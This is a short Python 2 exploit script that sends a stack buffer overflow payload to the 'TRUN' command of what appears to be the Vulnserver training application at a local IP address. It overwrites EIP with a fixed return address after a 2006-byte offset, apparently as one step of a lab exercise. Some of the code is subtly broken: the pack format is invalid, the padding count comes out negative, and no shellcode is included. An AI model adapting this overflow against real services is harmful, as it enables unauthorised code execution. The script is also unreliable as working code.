import socket
import struct
import sys
import os

trun = "TRUN ."
offset = 2006
eip = struct.pack("<1", 0x62501205)

payload = ""
payload += trun
payload += "A" * offset
payload += eip
payload += "C"*(1099 - offset - len(eip))

print "[*]Executing the script (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.8.107", 9999))
print(s.recv(1024))
s.send(payload)
s.close()